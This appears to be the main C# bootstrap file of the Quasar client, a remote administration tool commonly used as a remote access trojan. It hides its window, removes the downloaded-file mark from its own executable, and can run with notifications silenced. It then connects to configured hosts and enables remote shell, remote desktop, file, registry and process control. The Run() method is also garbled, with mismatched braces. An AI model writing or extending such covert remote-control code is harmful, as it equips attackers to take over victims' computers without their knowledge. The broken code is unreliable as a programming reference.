using Quasar.Client.Config;
using Quasar.Client.Messages;
using Quasar.Client.Networking;
using Quasar.Client.User;
using Quasar.Client.Utilities;
using Quasar.Common.DNS;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client
{
    /// <summary>
    /// The client application which handles basic bootstrapping of the message processors and background tasks.
    /// </summary>
    public class QuasarApplication : Form
    {
        /// <summary>
        /// A system-wide mutex that ensures that only one instance runs at a time.
        /// </summary>
        public SingleInstanceMutex ApplicationMutex;

        /// <summary>
        /// The client used for the connection to the server.
        /// </summary>
        private QuasarClient _connectClient;

        /// <summary>
        /// List of <see cref="IMessageProcessor"/> to keep track of all used message processors.
        /// </summary>
        private readonly List<IMessageProcessor> _messageProcessors;
        

        /// <summary>
        /// Keeps track of the user activity.
        /// </summary>
        private ActivityDetection _userActivityDetection;


        /// <summary>
        /// Notification icon used to show notifications in the taskbar.
        /// </summary>
        private readonly NotifyIcon _notifyIcon;

        /// <summary>
        /// Initializes a new instance of the <see cref="QuasarApplication"/> class.
        /// </summary>
        public QuasarApplication()
        {
            _messageProcessors = new List<IMessageProcessor>();
            _notifyIcon = new NotifyIcon();
        }

        /// <summary>
        /// Starts the application.
        /// </summary>
        /// <param name="e">An System.EventArgs that contains the event data.</param>
        protected override void OnLoad(EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            Run();
            base.OnLoad(e);
        }

        /// <summary>
        /// Initializes the notification icon.
        /// </summary>
        private void InitializeNotifyicon()
        {
            _notifyIcon.Text = "Quasar Client\nNo connection";
            _notifyIcon.Visible = true;
            try
            {
                _notifyIcon.Icon = Icon.ExtractAssociatedIcon(Assembly.GetExecutingAssembly().Location);
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
                _notifyIcon.Icon = SystemIcons.Application;
            }
        }

        /// <summary>
        /// Begins running the application.
        /// </summary>
        public void Run()
        {
            // decrypt and verify the settings
            if (!Settings.Initialize())
                Environment.Exit(1);

            ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);

            // check if process with same mutex is already running on system
            if (!ApplicationMutex.CreatedNew)
                Environment.Exit(2);

            FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);

            if (!Settings.UNATTENDEDMODE)
                InitializeNotifyicon();

                var hosts = new HostsManager(new HostsConverter().RawHostsToList(Settings.HOSTS));
                _connectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
                _connectClient.ClientState += ConnectClientOnClientState;
                InitializeMessageProcessors(_connectClient);

                _userActivityDetection = new ActivityDetection(_connectClient);
                _userActivityDetection.Start();

                new Thread(() =>
                {
                    // Start connection loop on new thread and dispose application once client exits.
                    // This is required to keep the UI thread responsive and run the message loop.
                    _connectClient.ConnectLoop();
                    Environment.Exit(0);
                }).Start();
            }
        }

        private void ConnectClientOnClientState(Networking.Client s, bool connected)
        {
            if (connected)
                _notifyIcon.Text = "Quasar Client\nConnection established";
            else
                _notifyIcon.Text = "Quasar Client\nNo connection";
        }

        /// <summary>
        /// Adds all message processors to <see cref="_messageProcessors"/> and registers them in the <see cref="MessageHandler"/>.
        /// </summary>
        /// <param name="client">The client which handles the connection.</param>
        /// <remarks>Always initialize from UI thread.</remarks>
        private void InitializeMessageProcessors(QuasarClient client)
        {
            _messageProcessors.Add(new ClientServicesHandler(this, client));
            _messageProcessors.Add(new FileManagerHandler(client));
            _messageProcessors.Add(new MessageBoxHandler());
            _messageProcessors.Add(new RegistryHandler());
            _messageProcessors.Add(new RemoteDesktopHandler());
            _messageProcessors.Add(new RemoteShellHandler(client));
            _messageProcessors.Add(new ShutdownHandler());
            _messageProcessors.Add(new SystemInformationHandler());
            _messageProcessors.Add(new TaskManagerHandler(client));
            _messageProcessors.Add(new TcpConnectionsHandler());
            _messageProcessors.Add(new WebsiteVisitorHandler());

            foreach (var msgProc in _messageProcessors)
            {
                MessageHandler.Register(msgProc);
                if (msgProc is NotificationMessageProcessor notifyMsgProc)
                    notifyMsgProc.ProgressChanged += ShowNotification;
            }
        }

        /// <summary>
        /// Disposes all message processors of <see cref="_messageProcessors"/> and unregisters them from the <see cref="MessageHandler"/>.
        /// </summary>
        private void CleanupMessageProcessors()
        {
            foreach (var msgProc in _messageProcessors)
            {
                MessageHandler.Unregister(msgProc);
                if (msgProc is NotificationMessageProcessor notifyMsgProc)
                    notifyMsgProc.ProgressChanged -= ShowNotification;
                if (msgProc is IDisposable disposableMsgProc)
                    disposableMsgProc.Dispose();
            }
        }

        private void ShowNotification(object sender, string value)
        {
            if (Settings.UNATTENDEDMODE)
                return;
            
            _notifyIcon.ShowBalloonTip(4000, "Quasar Client", value, ToolTipIcon.Info);
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                CleanupMessageProcessors();
                _userActivityDetection?.Dispose();
                ApplicationMutex?.Dispose();
                _connectClient?.Dispose();
                _notifyIcon.Visible = false;
                _notifyIcon.Dispose();
            }
            base.Dispose(disposing);
        }
    }
}
